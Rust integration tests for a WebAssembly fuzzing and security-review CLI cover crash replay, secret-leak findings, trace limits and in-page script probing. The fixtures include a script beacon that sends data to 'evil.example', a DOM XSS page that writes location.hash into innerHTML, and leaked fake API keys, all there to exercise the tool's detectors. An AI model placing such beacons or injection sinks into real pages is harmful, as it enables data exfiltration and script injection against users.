//! CLI contracts, using tiny components independent of the detector bench.
use serde_json::{Value, json};
use std::{
    path::PathBuf,
    process::Command,
    sync::atomic::{AtomicU64, Ordering},
};

struct Fixture {
    dir: PathBuf,
    manifest: PathBuf,
}
impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.dir);
    }
}

fn component(wit: &str, wat: &str) -> Vec<u8> {
    let mut resolve = wit_parser::Resolve::new();
    let pkg = resolve.push_str("test.wit", wit).unwrap();
    let world = resolve.select_world(&[pkg], Some("app")).unwrap();
    let mut module = wat::parse_str(wat).unwrap();
    wit_component::embed_component_metadata(&mut module, &resolve, world, wit_component::StringEncoding::UTF8, false).unwrap();
    wit_component::ComponentEncoder::default().module(&module).unwrap().validate(true).encode().unwrap()
}

impl Fixture {
    fn new(echo: bool) -> Self {
        static NEXT: AtomicU64 = AtomicU64::new(0);
        let dir = loop {
            let candidate = std::env::temp_dir().join(format!("appfuzz-workflow-{}-{}", std::process::id(), NEXT.fetch_add(1, Ordering::Relaxed)));
            match std::fs::create_dir(&candidate) {
                Ok(()) => break candidate,
                Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
                Err(e) => panic!("creating {}: {e}", candidate.display()),
            }
        };
        let manifest = dir.join("appfuzz.toml");
        let (wit, wat, request, output) = if echo {
            (
                "package test:workflow; world app { export run: func(input: string) -> string; }",
                r#"
            (module
              (memory (export "memory") 4)
              (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32) (i32.const 1024))
              (func (export "run") (param i32 i32) (result i32)
                (i32.store (i32.const 0) (local.get 0))
                (i32.store (i32.const 4) (local.get 1))
                (i32.const 0)))"#,
                "\"safe\"",
                "output = { body = \"\", body_format = \"html\" }",
            )
        } else {
            (
                "package test:workflow; interface db { get: func(id: u32) -> u32; } world app { import db; export run: func(n: u32) -> u32; }",
                r#"
            (module
              (import "test:workflow/db" "get" (func $get (param i32) (result i32)))
              (memory (export "memory") 1)
              (func (export "run") (param i32) (result i32) (call $get (local.get 0))))"#,
                "1",
                "",
            )
        };
        std::fs::write(dir.join("app.wasm"), component(wit, wat)).unwrap();
        std::fs::write(&manifest, format!("[app]\nwasm = \"app.wasm\"\n[entry]\nexport = \"run\"\nrequest = {request}\n{output}\n[limits]\nfuel = 1000000\ncost_per_request = 100\nmax_latency_ms = 200\n")).unwrap();
        Self { dir, manifest }
    }
    fn cli(&self, args: &[&str]) -> (i32, Value) {
        let out = Command::new(env!("CARGO_BIN_EXE_appfuzz"))
            .args(["-j", "1", "-m"])
            .arg(&self.manifest)
            .arg("--state")
            .arg(self.dir.join("state"))
            .args(args)
            .output()
            .unwrap();
        let value = serde_json::from_slice(&out.stdout)
            .unwrap_or_else(|e| panic!("{args:?}: {e}: {} / {}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr)));
        (out.status.code().unwrap(), value)
    }
    fn edit(&self, from: &str, to: &str) {
        let s = std::fs::read_to_string(&self.manifest).unwrap();
        std::fs::write(&self.manifest, s.replace(from, to)).unwrap();
    }
    fn review(&self) -> (i32, Value) {
        self.cli(&["review", "--runs", "40", "--time", "2s"])
    }
}

fn assert_legacy_finding_case_replays(f: &Fixture, case: &str, sequence: bool) {
    let mut saved: Value = serde_json::from_slice(&std::fs::read(case).unwrap()).unwrap();
    let id = if sequence { &mut saved["finding"] } else { &mut saved["finding"]["id"] };
    let original = id.as_str().unwrap();
    assert_eq!(original.len(), 33);
    *id = json!(&original[..9]);
    let path = f.dir.join("legacy-case.json");
    std::fs::write(&path, saved.to_string()).unwrap();
    let mut command = if sequence { vec!["sequence", "replay", path.to_str().unwrap()] } else { vec!["replay", path.to_str().unwrap()] };
    let (code, replayed) = f.cli(&command);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true, "{replayed}");
    command.push("--against-current");
    let (code, replayed) = f.cli(&command);
    assert_eq!(code, 2, "{replayed}");
    assert_eq!(replayed["reproduced"], true, "{replayed}");
}

#[test]
fn crash_case_regressions_still_fail_when_the_crash_moves() {
    let f = Fixture::new(false);
    let wit = "package test:workflow; world app {export run:func(n:u32)->u32;}";
    std::fs::write(f.dir.join("app.wasm"), component(wit, r#"(module (func (export "run") (param i32) (result i32) unreachable))"#)).unwrap();
    let (_, first) = f.cli(&["run"]);
    let original = first["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "crash").unwrap()["id"].as_str().unwrap();
    let (_, confirmed) = f.cli(&["confirm", original, "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    std::fs::write(f.dir.join("app.wasm"), component(wit, r#"(module (func (export "run") (param i32) (result i32) nop unreachable))"#)).unwrap();
    let (_, moved) = f.cli(&["run"]);
    let changed = moved["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "crash").unwrap();
    assert_ne!(changed["id"], original);
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 2, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    std::fs::write(f.dir.join("app.wasm"), component(wit, r#"(module (func (export "run") (param i32) (result i32) (i32.const 7)))"#)).unwrap();
    let (code, fixed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{fixed}");
    assert_eq!(fixed["reproduced"], false);
}

#[test]
fn extism_error_leaks_survive_storage_confirmation_and_replay() {
    let f = Fixture::new(false);
    std::fs::write(
        f.dir.join("plugin.wit"),
        "package extism:host; interface user { credential:func()->string; } world plugin { import user; export run:func()->string; }",
    )
    .unwrap();
    std::fs::write(f.dir.join("platform.toml"), "[platform]\nname='errors'\nabi='extism'\nwit='plugin.wit'\n").unwrap();
    std::fs::write(
        &f.manifest,
        "[app]\nwasm='app.wasm'\nplatform='platform.toml'\n[entry]\nexport='run'\n[functions.\"extism:host/user#credential\"]\nresult='secret'\n",
    )
    .unwrap();
    let wasm = wat::parse_str(
        r#"(module
        (import "extism:host/user" "credential" (func $credential (result i64)))
        (import "extism:host/env" "error_set" (func $error (param i64)))
        (func (export "run") (result i32) (call $error (call $credential)) (i32.const 0)))"#,
    )
    .unwrap();
    std::fs::write(f.dir.join("app.wasm"), wasm).unwrap();
    let (_, run) = f.cli(&["run"]);
    let finding = run["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "secret_leak").unwrap_or_else(|| panic!("{run}"));
    let (_, stored) = f.cli(&["show", run["run"].as_str().unwrap()]);
    assert!(stored["guest_error"].as_str().is_some_and(|text| text.starts_with("sk_")), "{stored}");
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    let fixed = wat::parse_str(
        r#"(module
        (import "extism:host/user" "credential" (func $credential (result i64)))
        (func (export "run") (result i32) (drop (call $credential)) (i32.const 0)))"#,
    )
    .unwrap();
    std::fs::write(f.dir.join("app.wasm"), fixed).unwrap();
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false);
}

#[test]
fn overflowing_extism_log_capture_cannot_pass_review_or_create_an_envelope() {
    let f = Fixture::new(false);
    std::fs::write(f.dir.join("plugin.wit"), "package test:logging; world plugin { export run:func()->string; }").unwrap();
    std::fs::write(f.dir.join("platform.toml"), "[platform]\nname='logging'\nabi='extism'\nwit='plugin.wit'\n").unwrap();
    std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\nplatform='platform.toml'\n[entry]\nexport='run'\n").unwrap();
    let wasm = wat::parse_str(
        r#"(module
        (import "extism:host/env" "alloc" (func $alloc (param i64) (result i64)))
        (import "extism:host/env" "log_info" (func $log (param i64)))
        (func (export "run") (result i32) (call $log (call $alloc (i64.const 2097152))) (i32.const 0)))"#,
    )
    .unwrap();
    std::fs::write(f.dir.join("app.wasm"), wasm).unwrap();
    let (code, run) = f.cli(&["run"]);
    assert_eq!(code, 3, "{run}");
    assert_eq!(run["outcome"]["kind"], "error");
    assert!(run["outcome"]["message"].as_str().unwrap().contains("log capture"));
    assert!(!run["findings"].as_array().unwrap().iter().any(|finding| finding["kind"] == "crash"));
    let (code, review) = f.cli(&["review", "--runs", "1", "--time", "1ms", "--confirm", "0"]);
    assert_eq!(code, 3, "{review}");
    assert_eq!(review["verdict"], "incomplete");
    assert_eq!(review["status"], "incomplete");
    let (code, envelope) = f.cli(&["envelope", "--review", review["session"].as_str().unwrap()]);
    assert_eq!(code, 3, "{envelope}");
    assert!(envelope["error"].as_str().unwrap().contains("complete passing review"));
}

#[test]
fn rejected_extism_output_leaks_confirm_replay_and_regress() {
    let f = Fixture::new(false);
    std::fs::write(
        f.dir.join("plugin.wit"),
        "package extism:host; interface user { credential:func()->string; } world plugin { import user; export run:func()->u32; }",
    )
    .unwrap();
    std::fs::write(f.dir.join("platform.toml"), "[platform]\nname='rejected'\nabi='extism'\nwit='plugin.wit'\n").unwrap();
    std::fs::write(
        &f.manifest,
        "[app]\nwasm='app.wasm'\nplatform='platform.toml'\n[entry]\nexport='run'\n[functions.\"extism:host/user#credential\"]\nresult='secret'\n",
    )
    .unwrap();
    let wasm = wat::parse_str(
        r#"(module
        (import "extism:host/user" "credential" (func $credential (result i64)))
        (import "extism:host/env" "alloc" (func $alloc (param i64) (result i64)))
        (import "extism:host/env" "length" (func $length (param i64) (result i64)))
        (import "extism:host/env" "load_u8" (func $read (param i64) (result i32)))
        (import "extism:host/env" "store_u8" (func $write (param i64 i32)))
        (import "extism:host/env" "output_set" (func $output (param i64 i64)))
        (func (export "run") (result i32) (local $source i64) (local $block i64) (local $i i64)
            (local.set $source (call $credential))
            (local.set $block (call $alloc (i64.add (call $length (local.get $source)) (i64.const 2))))
            (call $write (local.get $block) (i32.const 34))
            (loop $bytes
                (call $write (i64.add (local.get $block) (i64.add (local.get $i) (i64.const 1)))
                    (call $read (i64.add (local.get $source) (local.get $i))))
                (local.set $i (i64.add (local.get $i) (i64.const 1)))
                (br_if $bytes (i64.lt_u (local.get $i) (call $length (local.get $source)))))
            (call $write (i64.add (local.get $block) (i64.add (local.get $i) (i64.const 1))) (i32.const 34))
            (call $output (local.get $block) (call $length (local.get $block))) (i32.const 0)))"#,
    )
    .unwrap();
    std::fs::write(f.dir.join("app.wasm"), wasm).unwrap();
    let (_, run) = f.cli(&["run"]);
    let finding = run["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "secret_leak").unwrap_or_else(|| panic!("{run}"));
    let (_, stored) = f.cli(&["show", run["run"].as_str().unwrap()]);
    let rejected: Vec<u8> = serde_json::from_value(stored["rejected_output"].clone()).unwrap();
    assert!(String::from_utf8(rejected).unwrap().starts_with("\"sk_"));
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    std::fs::write(f.dir.join("app.wasm"), wat::parse_str("(module (func (export \"run\") (result i32) (i32.const 0)))").unwrap()).unwrap();
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false);
}

#[test]
fn trace_capture_limits_are_incomplete_in_run_scale_fuzz_and_review() {
    let f = Fixture::new(false);
    let wit = "package test:workflow; interface db { get:func(id:u32)->u32; } world app { import db; export run:func(n:u32)->u32; }";
    let wat = r#"(module
        (import "test:workflow/db" "get" (func $get (param i32) (result i32)))
        (memory (export "memory") 1)
        (func (export "run") (param $n i32) (result i32) (local $i i32)
            (loop $again
                (drop (call $get (local.get $i)))
                (local.set $i (i32.add (local.get $i) (i32.const 1)))
                (br_if $again (i32.lt_u (local.get $i) (local.get $n))))
            (local.get $n)))"#;
    std::fs::write(f.dir.join("app.wasm"), component(wit, wat)).unwrap();
    f.edit("fuel = 1000000", "fuel = 100000000");
    f.edit("[limits]\n", "[limits]\nwall_timeout_ms=30000\n");
    let mut manifest = std::fs::read_to_string(&f.manifest).unwrap();
    manifest.push_str("\n[functions.\"test:workflow/db#get\"]\ncost=0\nlatency_ms=0\n");
    std::fs::write(&f.manifest, manifest).unwrap();
    let (code, run) = f.cli(&["run", "--args", "[65537]"]);
    assert_eq!(code, 3, "{run}");
    assert_eq!(run["outcome"]["kind"], "error");
    assert_eq!(run["totals"]["host_calls"], 65536);
    let (_, stored) = f.cli(&["show", run["run"].as_str().unwrap()]);
    assert_eq!(stored["capture_limited"], true);
    drop(stored);
    let (code, scaled) = f.cli(&["scale", "field:@0", "--sizes", "1,65537"]);
    assert_eq!(code, 3, "{scaled}");
    assert!(scaled["error"].as_str().unwrap().contains("trace capture"));
    let (code, fuzzed) = f.cli(&["fuzz", "--args", "[65537]", "--runs", "1", "--time", "1ms"]);
    assert_eq!(code, 3, "{fuzzed}");
    assert!(fuzzed["error"].as_str().unwrap().contains("trace capture"));
    let (code, review) = f.cli(&["review", "--args", "[65537]", "--runs", "1", "--time", "1ms", "--confirm", "0"]);
    assert_eq!(code, 3, "{review}");
    assert_eq!(review["verdict"], "incomplete");
    let (code, envelope) = f.cli(&["envelope", "--review", review["session"].as_str().unwrap()]);
    assert_eq!(code, 3, "{envelope}");
    f.edit("cost=0", "cost=1");
    let (code, budget) = f.cli(&["run", "--args", "[65537]"]);
    assert_eq!(code, 0, "{budget}");
    assert_eq!(budget["outcome"]["kind"], "budget_exceeded");
    let finding = budget["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "over_budget").unwrap();
    assert!(!budget["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "crash" || f["kind"] == "hang"));
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "24"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let (_, minimized) = f.cli(&["show", confirmed["minimised_run"].as_str().unwrap()]);
    assert_eq!(minimized["outcome"]["kind"], "ok");
    assert_ne!(minimized["capture_limited"], true);
}

#[test]
fn generation_configuration_errors_are_distinct_from_guest_crashes() {
    let f = Fixture::new(false);
    let (code, invalid_mode) = f.cli(&["run", "--plan", r#"{"test:workflow/db#get":{"generate":{"numbers":"edges"}}}"#]);
    assert_eq!(code, 3, "{invalid_mode}");
    assert!(invalid_mode["error"].as_str().unwrap().contains("generation mode"));

    let (code, invalid_value) = f.cli(&["run", "--plan", r#"{"test:workflow/db#get":{"generate":{"numbers":"=-1"}}}"#]);
    assert_eq!(code, 3, "{invalid_value}");
    assert_eq!(invalid_value["outcome"]["kind"], "plan_error");
    assert!(!invalid_value["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "crash"));

    let (code, converted) = f.cli(&["run", "--plan", r#"{"test:workflow/db#get":{"generate":{"numbers":"cast:-1"}}}"#]);
    assert_eq!(code, 0, "{converted}");
    assert_eq!(converted["result"], json!(u32::MAX));
}

fn browser_named_target(body: &str) -> Vec<u8> {
    let escaped = body.bytes().map(|b| format!("\\{b:02x}")).collect::<String>();
    wat::parse_str(format!(
        r#"(component
        (core module $m
            (memory (export "memory") 1)
            (data (i32.const 64) "{escaped}")
            (func (export "session") (result i32)
                (i32.store (i32.const 0) (i32.const 64))
                (i32.store (i32.const 4) (i32.const {length})) (i32.const 0)))
        (core instance $m (instantiate $m))
        (alias core export $m "memory" (core memory $memory))
        (func $session (result string) (canon lift (core func $m "session") (memory $memory)))
        (instance $page (export "session" (func $session)))
        (export "appfuzz:browser/page" (instance $page)))"#,
        length = body.len()
    ))
    .unwrap()
}

#[test]
fn targets_using_the_browser_export_keep_their_output_policy_and_budgets() {
    let f = Fixture::new(false);
    std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\n[entry]\nexport='appfuzz:browser/page#session'\noutput={body='',body_format='html'}\nresult={''='html:safe'}\n[limits]\nfuel=1\n").unwrap();
    std::fs::write(f.dir.join("app.wasm"), browser_named_target("<script>alert(1)</script>")).unwrap();
    let (_, run) = f.cli(&["run", "--fuel", "10000"]);
    assert!(run["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "script_in_output"), "{run}");
    assert!(run["over_limits"].as_array().unwrap().iter().any(|l| l["limit"] == "fuel"), "{run}");
    let id = run["run"].as_str().unwrap();
    let mut results = Vec::new();
    for rebuilt in [false, true] {
        if rebuilt {
            std::fs::write(f.dir.join("app.wasm"), browser_named_target("<p>new build</p>")).unwrap();
        }
        let (code, explained) = f.cli(&["explain", id]);
        assert_eq!(code, 0, "{explained}");
        results.push((rebuilt, "explain", explained["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "script_in_output")));
        let (code, summary) = f.cli(&["show", id, "--view", "summary"]);
        assert_eq!(code, 0, "{summary}");
        results.push((rebuilt, "summary", summary["over_limits"].as_array().unwrap().iter().any(|l| l["limit"] == "fuel" && l["limit_value"] == 1)));
    }
    assert!(results.iter().all(|(_, _, correct)| *correct), "{results:?}");
}

#[test]
fn genuine_browser_runs_use_the_browser_budget_even_with_an_older_contract() {
    let f = Fixture::new(true);
    f.edit("\"safe\"", &toml::Value::String("<script>navigator.sendBeacon('https://evil.example/collect','public')</script>".into()).to_string());
    f.edit("body_format = \"html\" }", "body_format = \"html\" }\nresult = { \"\" = \"html:scripts\" }");
    f.edit("cost_per_request = 100", "cost_per_request = 0");
    let (_, visits) = f.cli(&["probe", "scripts"]);
    assert_eq!(visits["status"], "complete", "{visits}");
    let id = visits["pages"][0]["browser_run"].as_str().unwrap();
    let (_, value) = f.cli(&["show", id]);
    let mut r: appfuzz_core::record::RunRecord = serde_json::from_value(value).unwrap();
    assert!(r.totals.cost > 0);
    for legacy in [false, true] {
        if legacy {
            r.spec.contract = "a previous engine contract".into();
            r.id = r.spec.id();
            appfuzz_core::store::RunStore::new(&f.dir.join("state")).save(&r).unwrap();
        }
        let (code, summary) = f.cli(&["show", &r.id, "--view", "summary"]);
        assert_eq!(code, 0, "{summary}");
        assert!(summary["over_limits"].as_array().unwrap().is_empty(), "{summary}");
        let (code, explanation) = f.cli(&["explain", &r.id]);
        assert_eq!(code, 0, "{explanation}");
        assert!(explanation["findings"].as_array().unwrap().iter().all(|f| f["kind"] != "over_budget"), "{explanation}");
    }
}

#[test]
fn reviewing_the_browser_binary_itself_uses_the_targets_own_contract() {
    let f = Fixture::new(false);
    std::fs::write(f.dir.join("app.wasm"), appfuzz_core::browser::GUEST).unwrap();
    let input = json!({"url":"https://app.example/","html":"<p>hello</p>"}).to_string();
    std::fs::write(
        &f.manifest,
        format!(
            "[app]\nwasm='app.wasm'\n[entry]\nexport='appfuzz:browser/page#session'\nrequest={}\n[limits]\nfuel=1\nmemory='256MiB'\n",
            toml::Value::String(input.clone())
        ),
    )
    .unwrap();
    let (_, run) = f.cli(&["run", "--fuel", "200000000"]);
    assert!(run["over_limits"].as_array().unwrap().iter().any(|l| l["limit"] == "fuel"), "{run}");
    let id = run["run"].as_str().unwrap();
    let (code, summary) = f.cli(&["show", id, "--view", "summary"]);
    assert_eq!(code, 0, "{summary}");
    assert!(summary["over_limits"].as_array().unwrap().iter().any(|l| l["limit"] == "fuel" && l["limit_value"] == 1), "{summary}");
    let (_, value) = f.cli(&["show", id]);
    let mut archived: appfuzz_core::record::RunRecord = serde_json::from_value(value).unwrap();
    archived.spec.contract = "a previous target contract".into();
    archived.id = archived.spec.id();
    let store = appfuzz_core::store::RunStore::new(&f.dir.join("state"));
    store.save(&archived).unwrap();
    let (code, summary) = f.cli(&["show", &archived.id, "--view", "summary"]);
    assert_eq!(code, 0, "{summary}");
    assert!(summary["over_limits"].as_array().unwrap().iter().any(|l| l["limit"] == "fuel" && l["limit_value"] == 1), "{summary}");

    // A genuine visit uses the same bytes with the built-in browser contract.
    let browser = &appfuzz_core::browser::Browser::shared().unwrap().app;
    let spec = browser.spec(browser.default_export().unwrap(), vec![json!(input)], appfuzz_core::plan::Plan::default(), 1);
    let visit = browser.run(&spec);
    assert_eq!(visit.outcome.kind, appfuzz_core::record::OutcomeKind::Ok, "{:?}", visit.outcome);
    assert_eq!(visit.spec.component, archived.spec.component);
    store.save(&visit).unwrap();
    let (code, summary) = f.cli(&["show", &visit.id, "--view", "summary"]);
    assert_eq!(code, 0, "{summary}");
    assert!(summary["over_limits"].as_array().unwrap().is_empty(), "{summary}");
}

fn private_result_fixture(encoded: bool, publish: bool) -> Vec<u8> {
    let mut source = include_str!("../../appfuzz-core/tests/fixtures/encoded_result.wat").to_string();
    if !publish {
        source = source
            .replace("(i32.store (i32.const 8) (i32.const 8192))", "(i32.store (i32.const 8) (i32.const 128))")
            .replace("(i32.store (i32.const 12) (i32.mul (local.get $n) (i32.const 2)))", "(i32.store (i32.const 12) (i32.const 2))");
    } else if !encoded {
        source = source
            .replace("(i32.store (i32.const 8) (i32.const 8192))", "(i32.store (i32.const 8) (i32.load (i32.const 1024)))")
            .replace("(i32.store (i32.const 12) (i32.mul (local.get $n) (i32.const 2)))", "(i32.store (i32.const 12) (local.get $n))");
    }
    wat::parse_str(source).unwrap()
}

#[test]
fn invalid_response_mappings_keep_privacy_findings_confirmable_and_replayable() {
    for (encoded, output) in [(false, "body='',body_format='text'"), (true, "body='body',headers='metadata',body_format='text'")] {
        let f = Fixture::new(false);
        std::fs::write(
            &f.manifest,
            format!("[app]\nwasm='app.wasm'\n[entry]\nexport='run'\noutput={{{output}}}\n[functions.\"test:payload/config#key\"]\nresult='secret'\n"),
        )
        .unwrap();
        std::fs::write(f.dir.join("app.wasm"), private_result_fixture(encoded, true)).unwrap();
        let plan = r#"{"test:payload/config#key":{"return":"sk_private_output_0123456789"}}"#;
        let (_, run) = f.cli(&["run", "--plan", plan]);
        let kind = if encoded { "encoded_flow" } else { "secret_leak" };
        let finding = run["findings"].as_array().unwrap().iter().find(|f| f["kind"] == kind).unwrap_or_else(|| panic!("{run}"));
        assert_eq!(finding["severity"], "fail", "{finding}");
        let (_, confirmation) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "32"]);
        assert_eq!(confirmation["confirmed"], true, "{confirmation}");
        let case = confirmation["case"].as_str().unwrap();
        let saved: Value = serde_json::from_slice(&std::fs::read(case).unwrap()).unwrap();
        assert_eq!(saved["finding"]["detail"]["at"], "metadata", "{saved}");
        let (code, replayed) = f.cli(&["replay", case]);
        assert_eq!(code, 0, "{replayed}");
        assert_eq!(replayed["reproduced"], true, "{replayed}");
        std::fs::write(f.dir.join("app.wasm"), private_result_fixture(encoded, false)).unwrap();
        let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
        assert_eq!(code, 0, "{replayed}");
        assert_eq!(replayed["reproduced"], false, "{replayed}");
        let (_, fixed) = f.cli(&["run", "--plan", plan]);
        assert_eq!(fixed["outcome"]["kind"], "ok", "{fixed}");
        assert_eq!(fixed["result"]["metadata"], "ok", "{fixed}");
        assert_eq!(fixed["calls_per_function"]["test:payload/config#key"], 1, "{fixed}");
    }
}

/// `probe scripts` runs the page's own script: the link's #fragment put
/// into innerHTML is DOM XSS. The finding confirms and replays like any
/// other; the same page with textContent shows nothing.
#[test]
fn page_scripts_run_confirm_and_replay() {
    let f = Fixture::new(true);
    let page = |sink: &str| format!(r#""<p id=g></p><script>document.getElementById(\"g\").{sink} = decodeURIComponent(location.hash.slice(1))</script>""#);
    f.edit("\"safe\"", &page("innerHTML"));
    f.edit("body_format = \"html\" }", "body_format = \"html\" }\nresult = { \"\" = \"html:scripts\" }");
    let (_, out) = f.cli(&["probe", "scripts"]);
    assert!(out["pages"].as_array().is_some_and(|p| !p.is_empty()), "{out}");
    let finding = out["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "html_injection").unwrap_or_else(|| panic!("{out}"));
    assert!(finding["title"].as_str().unwrap().contains("location.hash"), "{finding}");
    // `explain` on the finding's run shows what the scripts did; the page
    // visit itself opens with `explain` and `show` like any run.
    let (code, explained) = f.cli(&["explain", finding["run"].as_str().unwrap()]);
    assert_eq!(code, 0, "{explained}");
    let shown = explained["findings"].as_array().unwrap().iter().find(|v| v["id"] == finding["id"]).unwrap_or_else(|| panic!("{explained}"));
    assert_eq!(shown["detail"]["sink"], "innerHTML", "{shown}");
    let visit = shown["browser_run"].as_str().unwrap();
    let (code, explained) = f.cli(&["explain", visit]);
    assert_eq!(code, 0, "{explained}");
    assert!(explained["findings"].as_array().unwrap().iter().any(|v| v["id"] == finding["id"]), "{explained}");
    for view in ["summary", "calls"] {
        let (code, shown) = f.cli(&["show", visit, "--view", view]);
        assert_eq!(code, 0, "{view}: {shown}");
    }
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let (code, replayed) = f.cli(&["replay", confirmed["case"].as_str().unwrap()]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true, "{replayed}");

    let f = Fixture::new(true);
    f.edit("\"safe\"", &page("textContent"));
    f.edit("body_format = \"html\" }", "body_format = \"html\" }\nresult = { \"\" = \"html:scripts\" }");
    let (_, out) = f.cli(&["probe", "scripts"]);
    assert!(out["findings"].as_array().unwrap().iter().all(|v| v["kind"] != "html_injection"), "{out}");
}

#[test]
fn semantic_host_argument_violations_confirm_replay_and_regress() {
    let f = Fixture::new(false);
    f.edit("\nrequest = 1\n", "\nrequest = 7\n");
    let mut text = std::fs::read_to_string(&f.manifest).unwrap();
    text.push_str("\n[functions.\"test:workflow/db#get\"]\nparam_values={id='range:1..6'}\nvalue_source='test platform specification'\n");
    std::fs::write(&f.manifest, text).unwrap();
    let (_, r) = f.cli(&["run"]);
    let bad = r["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "invalid_host_argument").unwrap();
    assert_eq!(bad["evidence"], "policy_violation");
    let (_, confirmed) = f.cli(&["confirm", bad["id"].as_str().unwrap(), "--max-runs", "30"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    assert_eq!(confirmed["spec"]["args"][0], 7, "shrinking must keep an upper-bound violation above six");
    let case = confirmed["case"].as_str().unwrap();
    assert_eq!(f.cli(&["replay", case]).0, 0);
    assert_legacy_finding_case_replays(&f, case, false);
    let bytes = component(
        "package test:workflow; interface db { get:func(id:u32)->u32; } world app {import db;export run:func(n:u32)->u32;}",
        r#"(module (import "test:workflow/db" "get" (func $get (param i32) (result i32))) (func (export "run") (param i32) (result i32) (call $get (i32.const 1))))"#,
    );
    std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false);
}

#[test]
fn cached_execution_preserves_float_inputs_exactly() {
    let f = Fixture::new(false);
    std::fs::write(
        f.dir.join("app.wasm"),
        component(
            "package test:workflow; world app {export run:func(n:f64)->f64;}",
            r#"(module (func (export "run") (param f64) (result f64) (local.get 0)))"#,
        ),
    )
    .unwrap();
    f.edit("\nrequest = 1\n", "\nrequest = 3.3413571213205546e-193\n");
    let (code, first) = f.cli(&["run"]);
    assert_eq!(code, 0, "{first}");
    let (code, second) = f.cli(&["run"]);
    assert_eq!(code, 0, "{second}");
    assert_eq!(first["run"], second["run"]);
    assert_eq!(second["result"].as_f64().unwrap().to_bits(), 1727240679746839071);
    let (code, replayed) = f.cli(&["replay", "last"]);
    assert_eq!(code, 0, "{replayed}");
}

#[test]
fn cached_execution_distinguishes_positive_and_negative_zero() {
    let f = Fixture::new(false);
    std::fs::write(
        f.dir.join("app.wasm"),
        component(
            "package test:workflow; world app {export run:func(n:f64)->f64;}",
            r#"(module (func (export "run") (param f64) (result f64) (local.get 0)))"#,
        ),
    )
    .unwrap();
    f.edit("\nrequest = 1\n", "\nrequest = 0.0\n");
    let (code, first) = f.cli(&["run"]);
    assert_eq!(code, 0, "{first}");
    let path = f.dir.join("state/runs").join(format!("{}.json", first["run"].as_str().unwrap()));
    let mut stored: Value = serde_json::from_slice(&std::fs::read(&path).unwrap()).unwrap();
    stored["spec"]["args"][0] = json!(-0.0);
    std::fs::write(path, stored.to_string()).unwrap();
    let (code, second) = f.cli(&["run"]);
    assert_eq!(code, 3, "{second}");
}

#[test]
fn cached_execution_refuses_evidence_for_a_different_specification() {
    let f = Fixture::new(false);
    let (code, first) = f.cli(&["run", "--seed", "1"]);
    assert_eq!(code, 0, "{first}");
    let id = first["run"].as_str().unwrap();
    let path = f.dir.join("state/runs").join(format!("{id}.json"));
    let mut stored: Value = serde_json::from_slice(&std::fs::read(&path).unwrap()).unwrap();
    stored["spec"]["seed"] = json!(2);
    std::fs::write(&path, stored.to_string()).unwrap();
    let (code, second) = f.cli(&["run", "--seed", "1"]);
    assert_eq!(code, 3, "{second}");
    assert!(second["error"].as_str().unwrap().contains("specification"), "{second}");
}

#[test]
fn host_numeric_guarantees_are_repaired_as_representable_wit_values() {
    let f = Fixture::new(false);
    let mut manifest = std::fs::read_to_string(&f.manifest).unwrap();
    manifest.push_str("\n[functions.\"test:workflow/db#get\"]\nvalues={''='range:1.2..2.2'}\n");
    std::fs::write(&f.manifest, manifest).unwrap();
    for args in [vec!["run"], vec!["run", "--plan", r#"{"test:workflow/db#get":{"return":0}}"#]] {
        let (code, run) = f.cli(&args);
        assert_eq!(code, 0, "{run}");
        assert_eq!(run["result"], 2, "{run}");
    }
    f.edit("range:1.2..2.2", "range:0.1..0.2");
    let (code, run) = f.cli(&["run"]);
    assert_eq!(code, 3, "{run}");
}

#[test]
